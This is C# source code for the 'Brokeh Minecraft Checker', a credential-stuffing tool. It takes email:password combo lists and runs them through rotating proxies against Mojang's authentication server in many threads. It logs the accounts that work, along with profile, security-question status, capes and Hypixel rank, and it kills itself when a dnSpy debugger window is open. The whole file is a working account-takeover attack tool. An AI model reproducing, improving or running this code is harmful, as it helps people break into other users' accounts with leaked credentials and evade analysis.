using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xNet;
using System.Web;
using Newtonsoft.Json;
using System.Runtime.CompilerServices;
using Newtonsoft.Json.Linq;
using System.Net;
using System.Diagnostics;

namespace Brokeh_Minecraft_Checker
{
    public partial class Form1 : Form
    {

        string versao = "2.4.0";
        string changelog = "added dark theme and internal changes.";
        string[] combo;
        string[] proxies;
        int countGood;
        int countErro;
        int countBad;
        int countThreads;
        int countTested;
        object object_0;
        Random random_0 = new Random();
        Thread[] thread_0;
        int status; // 0 = STOPPED | 1 = RUNNING
        string username;
        public Form1(string hwid)
        {

            var processes = Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).ToList();
            foreach (var process in processes)
            {
                var id = process.Id;
                var Wintitle = process.MainWindowTitle.ToString();
                if (Wintitle.Contains("dnSpy"))
                {
                    Process.GetCurrentProcess().Kill();
                }
            }

            string error2 = "Internal error!";
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
            this.object_0 = RuntimeHelpers.GetObjectValue(new object());

            WebClient wC = new WebClient();

            string resposta = wC.DownloadString("http://brokeh-checker.tk/check.php?hwid=" + hwid);

            if (resposta.Contains("OK|"))
            {

                username = resposta.Replace("OK|", "");
                this.Text = "Brokeh Minecraft Checker v-"+versao+" [User: " + username+ "] ["+versao+": "+changelog+"]";

            }
            else if (resposta.Contains("Not authorized!"))
            {
                MessageBox.Show(resposta);

                Application.Exit();
            }
            else
            {
                MessageBox.Show(error2);

                Application.Exit();
            }
            resposta = wC.DownloadString("http://brokeh-checker.tk/versao.txt");
            if(!resposta.Contains(versao))
            {
                MessageBox.Show("New version available! Go to our website.");
            }
            else
            {

            }


        }
       

        public Queue<string> queue_0;

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "Select Combo List";
            ofd.Filter = "Combo | *.txt";
            if(ofd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    combo = File.ReadAllText(ofd.FileName).Split(new[] { Environment.NewLine }, StringSplitOptions.None);
                    var processes = Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).ToList();
                    foreach (var process in processes)
                    {
                        var id = process.Id;
                        var Wintitle = process.MainWindowTitle.ToString();
                        if (Wintitle.Contains("dnSpy"))
                        {
                            Process.GetCurrentProcess().Kill();
                        }
                    }
                }
                catch (Exception)
                {

                    MessageBox.Show("Invalid combo list.\nCombo format is EMAIL:PASSWORD");
                }
                
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "Select Proxy List";
            ofd.Filter = "Proxy | *.txt";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    proxies = File.ReadAllText(ofd.FileName).Split(new[] { Environment.NewLine }, StringSplitOptions.None);

                }
                catch (Exception)
                {

                    MessageBox.Show("Invalid proxylist list.\nProxylist format is IP:PORT");
                }
               
            }
        }

        void termina()
        {
            if(status == 1)
            {
                int num = Convert.ToInt32(this.quantidadeThreads.Value);
                for (int i = 0; i < num; i++)
                {
                    this.thread_0[i].Abort();
                    countThreads--;
                    if (countThreads == 0)
                    {
                        status = 0;
                        timer2.Stop();
                        pictureBox1.Visible = false;
                        MessageBox.Show("FINISHED!");
                    }
                }

            }
            else
            {
                MessageBox.Show("The checker is not running");
            }
           
        }
        void Checker()
        {
            var processes = Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).ToList();
            foreach (var process in processes)
            {
                var id = process.Id;
                var Wintitle = process.MainWindowTitle.ToString();
                if (Wintitle.Contains("dnSpy"))
                {
                    Process.GetCurrentProcess().Kill();
                }
            }
            if (status == 1)
            {
                int indexProxy = random_0.Next(1, proxies.Length);
                string proxyAtual = proxies[indexProxy];
                while (this.queue_0.Count > 0)
                {
                    object objectValue = RuntimeHelpers.GetObjectValue(this.object_0);
                    bool flag = false;
                    object objectValue3;
                    string text = "";
                    try
                    {
                        processes = Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).ToList();
                        foreach (var process in processes)
                        {
                            var id = process.Id;
                            var Wintitle = process.MainWindowTitle.ToString();
                            if (Wintitle.Contains("dnSpy"))
                            {
                                Process.GetCurrentProcess().Kill();
                            }
                        }
                        object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
                        objectValue3 = RuntimeHelpers.GetObjectValue(objectValue2);
                        Monitor.Enter(RuntimeHelpers.GetObjectValue(objectValue2), ref flag);
                        try
                        {


                            text = queue_0.Peek().ToString().Replace("\r", "");
                            this.queue_0.Dequeue();
                        }
                        catch (Exception ex)
                        {
                        }

                    }
                    finally
                    { }
                    if (flag)
                    {
                        Monitor.Exit(RuntimeHelpers.GetObjectValue(objectValue3));
                    }



                    try
                    {

                        string[] conta = text.Split(':');
                        using (HttpRequest httpRequest = new HttpRequest())
                        {

                            if(https.Checked == true)
                            {
                                httpRequest.Proxy = ProxyClient.Parse(ProxyType.Http, proxyAtual);
                            }
                            else
                            {
                                httpRequest.Proxy = ProxyClient.Parse(ProxyType.Socks5, proxyAtual);
                            }
                            
                            CookieDictionary cookies = new CookieDictionary(false);
                            httpRequest.Cookies = cookies;
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.ConnectTimeout = Convert.ToInt32(timeoutValue.Value) * 1000;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.KeepAlive = true;
                            httpRequest.Referer = "https://minecraft.net/pt-br/login/";
                            httpRequest.UserAgent = "Minecraft Launcher/2.0.1049 (061d773c8e) Windows (6.1; x86)";
                            httpRequest.AddHeader("Origin", "mojang://launcher");


                            string payload = string.Concat(new string[]
                                {
                            "{ \"agent\":{ \"name\":\"Minecraft\",\"version\":1},\"username\":\"",
                            conta[0],
                            "\",\"password\":\"",
                            conta[1],
                            "\",\"clientToken\":\"ec8503f9-f717-46b3-b755-78db16771163\",\"requestUser\":\"true\"}"
                                });


                            try
                            {
                                string resposta = httpRequest.Post("https://authserver.mojang.com/authenticate", payload, "application/json").ToString();
                                if (resposta.Contains("Invalid username or password."))
                                {
                                    
                                    countBad++;
                                   
                                }
                                else if (resposta.Contains("accessToken"))
                                {
                                    if (resposta.Contains("\"selectedProfile\":{"))
                                    {
                                        string extras = "";
                                        dynamic results = JsonConvert.DeserializeObject<dynamic>(resposta);

                                        string nick = results.availableProfiles[0].name;




                                        try
                                        {
                                            if(results.user.secured == true)
                                            {
                                                extras += "SFA: False | ";
                                            }
                                            else
                                            {
                                                extras += "SFA: True | ";
                                            }
                                        }
                                        catch (Exception)
                                        {
                                            extras += "SFA: Undefined | ";
                                        }




                                        // OPTIFINE CAPE CHECKER




                                        // MINECON AND UNMIGRATED CHECKER (NAMEMC.COM)

                                        string resposta2 = httpRequest.Get("https://mmvyoutube.pw/check/v1.0/cape/optifine.php?username=" + nick).ToString();
                                        extras += "Optifine Cape: " + resposta2 + " | ";
                                        string resposta3 = httpRequest.Get("https://mmvyoutube.pw/check/v1.0/cape/minecon.php?username=" + nick).ToString();
                                        extras += "Minecon Cape: "+resposta3+" | ";
                                        string respostaUnmigrated = httpRequest.Get("https://mmvyoutube.pw/check/v1.0/mojang/migration.php?username=" + nick).ToString();
                                        extras += respostaUnmigrated + " | ";
                                        string resposta4 = httpRequest.Get("https://mmvyoutube.pw/check/v1.0/rank/hypixel.php?username=" + nick).ToString();
                                        extras += "Hypixel Rank: " + resposta4 + " | ";
                                        
                                   
                                       
                                        aprovadas.AppendText("GOOD | " + conta[0] + " | " + conta[1] + " | NICK: " + nick + " | " + extras + " | PROXY: " + proxyAtual + " | #BrokehChecker" + Environment.NewLine);

                                        countGood++;

                                    }
                                    else
                                    {
                                        countBad++;
                                        
                                    }


                                }
                                else
                                {
                                    proxyAtual = proxies[random_0.Next(1, proxies.Length)];
                                    this.queue_0.Enqueue(text);
                                    countErro++;
                                }

                            }
                            catch (Exception)
                            {
                                proxyAtual = proxies[random_0.Next(1, proxies.Length)];
                                this.queue_0.Enqueue(text);
                                countErro++;
                                 processes = Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).ToList();
                                foreach (var process in processes)
                                {
                                    var id = process.Id;
                                    var Wintitle = process.MainWindowTitle.ToString();
                                    if (Wintitle.Contains("dnSpy"))
                                    {
                                        Process.GetCurrentProcess().Kill();
                                    }
                                }
                            }


                           



                        }

                    }
                    catch
                    {
                        countErro++;
                    }


                    countTested++;

                }
               
            }
           
        }
        private void button3_Click(object sender, EventArgs e)
        {
          
            if (status == 0) {
                pictureBox1.Visible = true;
                status = 1;


                button1.Enabled = false;
                button2.Enabled = false;
                button3.Enabled = false;
                socks5.Enabled = false;
                https.Enabled = false;


                timer2.Start();

                if (combo.Count() > 0 && proxies.Count() > 0)
                {
                    countGood = 0;
                    countErro = 0;
                    countTested = 0;
                    countBad = 0;
                    queue_0 = new Queue<string>();

                    int num = combo.Length;

                    for (int i = 0; i < num; i++)
                    {
                        queue_0.Enqueue(combo[i]);
                    }

                    int numerodethreads = Convert.ToInt32(quantidadeThreads.Value);

                    thread_0 = new Thread[numerodethreads];

                    int numerodethreadstotal = numerodethreads;
                    for (int j = 0; j < numerodethreadstotal; j++)
                    {
                        thread_0[j] = new Thread(new ThreadStart(Checker));
                        thread_0[j].IsBackground = true;
                        thread_0[j].Start();
                        countThreads++;
                    }


                }
                else
                {
                    MessageBox.Show("Load Combo list and Proxy list!");
                }
            }
            else
            {
                MessageBox.Show("Checker already started");
            }
           
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            label7.Text = "B R O K E H    M I N E C R A F T   C H E C K E R   "+versao;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            countErrorLabel.Text = countErro.ToString();
            countGoodsLabel.Text = countGood.ToString();
            countsTestedsLabel.Text = countTested.ToString();
            countBadLabel.Text = countBad.ToString();
            threadsCountLabel.Text = countThreads.ToString();


        }

        private void button4_Click(object sender, EventArgs e)
        {
            termina();
            button1.Enabled = true;
            button2.Enabled = true;
            button3.Enabled = true;
            socks5.Enabled = true;
            https.Enabled = true;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {

            Application.Exit();
        }

        private void groupBox4_Enter(object sender, EventArgs e)
        {

        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            if(status == 1)
            {
                if (countTested == combo.Length)
                {

                    timer2.Stop();
                    button4.PerformClick();
                }
            }
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void socks5_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void https_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void timeoutValue_ValueChanged(object sender, EventArgs e)
        {

        }

        private void quantidadeThreads_ValueChanged(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void threadsCountLabel_Click(object sender, EventArgs e)
        {

        }

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void countErrorLabel_Click(object sender, EventArgs e)
        {

        }

        private void countBadLabel_Click(object sender, EventArgs e)
        {

        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void countGoodsLabel_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void countsTestedsLabel_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}
